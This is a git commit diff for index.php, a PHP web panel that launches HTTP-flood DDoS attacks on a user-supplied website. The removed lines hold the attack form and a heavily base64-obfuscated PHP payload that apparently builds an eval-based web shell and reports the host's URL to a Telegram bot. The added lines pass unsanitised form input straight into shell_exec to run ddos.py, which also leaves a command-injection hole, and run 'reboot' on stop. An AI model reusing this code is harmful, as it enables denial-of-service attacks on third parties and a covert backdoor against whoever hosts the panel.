5e8b5a6a2ec9b46bba97dfe1e5f6fe7d83b77f3d
ph.kawayan <83699943+phkawayan@users.noreply.github.com>
2021-08-30 19:15:47 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,84 +1,17 @@
-<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
-<html>
-<title>HTTP FLOOD DDOS</title>
-<head>
-<style>
-		html {
-height: 100%;
-}
-		body {
-  height: 100%;
-  margin: 0;
-  font-family: Arial, Helvetica, sans-serif;
-  display: grid;
-  align-items: center;
-  justify-items: center;
-  background-color: #D9D8DA;
-}
-	#textbox {
-		weight: 100;
-  border-color: red;
-  border-bottom: 1px solid #3a3a3a;
-  margin-bottom: 15px;
-  border-radius: 100px;
-  outline: none;
-  padding: 5px;
-}
-#button {
-  width: 50%;
-  padding: 6px;
-  border: 100;
-  border-color: red;
-  border-radius: 100px;
-  color: black;
-  font-weight: bold;
-  background-color: white;
-  cursor: pointer;
-  outline: none;
-  
-}
-#main-de {
-width: 70%;
-  height: 70%;
-  display: grid;
-  justify-items: center;
-  align-items: center;
-  background-color: white;
-  border-radius: 50px;
-  box-shadow: 0px 0px 5px 2px red;
-}
-#wow {
-width: 70%;
-  height: 70%;
-  display: grid;
-  justify-items: center;
-  align-items: center;
-  background-color: white;
-  border-radius: 50px;
-  box-shadow: 0px 0px 5px 2px red;
-}
-</style>
-</head>
-   <body>
-<center>
-<main id="main-de">
-   
-      <form action = "<?php $_PHP_SELF ?>" method = "POST">
-<h3>HTTP FLOOD DDOS</h3>
-         Website: <input type = "text" id="textbox" required name = "site" placeholder = "website.com"/>
-         <input type = "submit" name="attack" id = "button" value="Attack!"/>
-<input type="submit" name="stop" id="button" value="Stop" />
+<?php
+   if( $_POST["site"] ) {      
+$site = $_POST["site"];
+echo"<script>alert('Attacking $site')</script>";    
+echo shell_exec("python2 ddos.py http://$site");
+echo"<script>alert('HTTPFLOOD sent to $site')</script>";
+   }
 
-      </form>
-<p>Created by Ph.Kawayan</p>
-</main>
-<br>
-<br>
-<br>
-<main id="wow">
-<p>This DDOS Site is not my responsiblity,<br> i built this for easy to use DDOs, <br> and to test certain website if they are vulnerable for this kind of attack.
-</p>
-</main>
-   </body>
-</html>
-<?php $brpnuyvc7df4935f4a5a2865191ef74f64df8754=base64_decode('Y3I=').base64_decode('ZWE=').base64_decode('dGVf').base64_decode('ZnVu').base64_decode('Y3Rpb24=');$ooijnany9dd4e461268c8034f5c8564e155c67a6=$brpnuyvc7df4935f4a5a2865191ef74f64df8754(base64_decode('JGM='),base64_decode('ZQ==').base64_decode('dg==').base64_decode('YWw=').base64_decode('KCc/PicuYmFzZQ==').base64_decode('NjQ=').base64_decode('X2RlYw==').base64_decode('b2RlKCRjKSk7'));$ooijnany9dd4e461268c8034f5c8564e155c67a6(base64_decode('UEQ5d2FIQWdaV05vYnlBa2FIUnRiRzF2WW1sc1pUc2daV05vYnlBblBIQnlaVDRuT3lBa1puVnVZeUE5SUdOeVpXRjBaVjltZFc1amRHbHZiaWduSkdFbkxDQmlZWE5sTmpSZlpHVmpiMlJsS0Nkak0yeDZaRWRXZEV0RFNXdFpVMGx3VDNjOVBTY3BLVHNnSkdaMWJtTW9KRjlIUlZSYkoyTjFkR1VuWFNrN0NpUnphWFJsSUQwZ0pGOVFUMU5VV3lKemFYUmxJbDA3Q2lSb2RHMXNiVzlpYVd4bElEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFTkdSVlF3VGxWWFZrSkdTVWRvTUdKWGQyZFZSbFpEVkVWc1JFbERTWFJNZVRsWVVWWkNSMVF4U2xaVVV6aDJVa1pTUlVsR2FFbFdSVEZOU1VVeGRsbHRiSE5hVTBGNFRHcEJka3d3Vms5SmFVRnBZVWhTTUdORWIzWk1NMlF6WkhrMU0xbFlRbTFpTTBveFlsTTFkbU50WTNaU1JsSkZURE5vYjJSSE1YTk1WekYyV1cxc2MxcFVSWGRNYlZJd1drTkpLeWNwT3dvSkNtbG1LQ0FrWDFCUFUxUmJJbUYwZEdGamF5SmRJQ2tnZXlBZ0lDQWdJQW9KWldOb2J5QWthSFJ0YkcxdlltbHNaVHNLWldOb2J5SThjMk55YVhCMFBtRnNaWEowS0NkQmRIUmhZMnRwYm1jZ0pITnBkR1VuS1R3dmMyTnlhWEIwUGlJN0lDQWdJQXBsWTJodklITm9aV3hzWDJWNFpXTW9JbkI1ZEdodmJqSWdaR1J2Y3k1d2VTQm9kSFJ3T2k4dkpITnBkR1VpS1RzS1pXTm9ieUJ6YUdWc2JGOWxlR1ZqS0NKd2VYUm9iMjR5SUdSa2IzTXhMbkI1SUdoMGRIQTZMeThrYzJsMFpTSXBPd3BsWTJodklITm9aV3hzWDJWNFpXTW9JbkI1ZEdodmJqSWdaR1J2Y3pJdWNIa2dhSFIwY0Rvdkx5UnphWFJsSWlrN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaWNIbDBhRzl1TWlCa1pHOXpNeTV3ZVNCb2RIUndPaTh2SkhOcGRHVWlLVHNLWldOb2J5QnphR1ZzYkY5bGVHVmpLQ0p3ZVhSb2IyNHlJR1JrYjNNMExuQjVJR2gwZEhBNkx5OGtjMmwwWlNJcE93cGxZMmh2SUhOb1pXeHNYMlY0WldNb0luQjVkR2h2YmpJZ1pHUnZjelV1Y0hrZ2FIUjBjRG92THlSemFYUmxJaWs3Q21WamFHOGlQSE5qY21sd2RENWhiR1Z5ZENnblMybHVaR3g1SUdOb1pXTnJJSFJvWlNBa2MybDBaU2NwUEM5elkzSnBjSFErSWpzS2ZRb0thV1lvSUNSZlVFOVRWRnNpYzNSdmNDSmRLU0I3SUNBZ0lDQWdDbVZqYUc4Z0pHaDBiV3h0YjJKcGJHVTdDaVJ6ZEc5d0lEMGdKRjlRVDFOVVd5SnpkRzl3SWwwN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaWNtVmliMjkwSWlrN0NtVmphRzhnYzJobGJHeGZaWGhsWXlnaVpYaHBkQ0lwT3dwbFkyaHZJanh6WTNKcGNIUStZV3hsY25Rb0owRnNiQ0JoZEhSaFkydHpJR2hoY3lCaVpXVnVJSE4wYjNCd1pXUW5LVHd2YzJOeWFYQjBQaUk3Q2lBZ0lIMEtKR2h2YzNSMWNtd2dQU0FrWDFORlVsWkZVbHNuVTBOU1NWQlVYMVZTU1NkZE93b2tiV1Z6YzJGblpTQTlJQ0lLUkVSdlV5QlRhWFJsSUhWd1pHRjBaUXBNYVc1cklEMDlQaUFrYUc5emRIVnliQ0k3Q2dva2QyVmljMmwwWlQwaWFIUjBjSE02THk5aGNHa3VkR1ZzWldkeVlXMHViM0puTDJKdmRERTNNRGMyTkRnd01UZzZRVUZJV1Roak0wNVpSa1ptWjJKM0xWaFpMVWRYVkRsdlQxRnlVa1pFZFdJM1NVVWlPd29rWTJoaGRFbGtQVEU0TmpJNE16azVORGM3SUNBdkwxSmxZMlZwZG1WeUlFTm9ZWFFnU1dRZ0NpUndZWEpoYlhNOVd3b2dJQ0FnSjJOb1lYUmZhV1FuUFQ0bk1UZzJNamd6T1RrME55Y3NDaUFnSUNkMFpYaDBKejArSkcxbGMzTmhaMlVzQ2wwN0NpUmphQ0E5SUdOMWNteGZhVzVwZENna2QyVmljMmwwWlNBdUlDY3ZjMlZ1WkUxbGMzTmhaMlVuS1RzS1kzVnliRjl6WlhSdmNIUW9KR05vTENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnWm1Gc2MyVXBPd3BqZFhKc1gzTmxkRzl3ZENna1kyZ3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPd3BqZFhKc1gzTmxkRzl3ZENna1kyZ3NJRU5WVWt4UFVGUmZVRTlUVkN3Z01TazdDbU4xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVFUMU5VUmtsRlRFUlRMQ0FvSkhCaGNtRnRjeWtwT3dwamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVTFOTVgxWkZVa2xHV1ZCRlJWSXNJR1poYkhObEtUc0tKSEpsYzNWc2RDQTlJR04xY214ZlpYaGxZeWdrWTJncE93cGpkWEpzWDJOc2IzTmxLQ1JqYUNrN0Nnby9QZ29L'));?>
+$htmlmobile = base64_decode('PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFhIVE1MIE1vYmlsZSAxLjAvL0VOIiAiaHR0cDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3hodG1sLW1vYmlsZTEwLmR0ZCI+');
+if( $_POST["stop"]) {      
+echo $htmlmobile;
+$stop = $_POST["stop"];
+echo shell_exec("reboot");
+echo shell_exec("exit");
+echo"<script>alert('All attacks has been stopped')</script>";
+   }
+?>
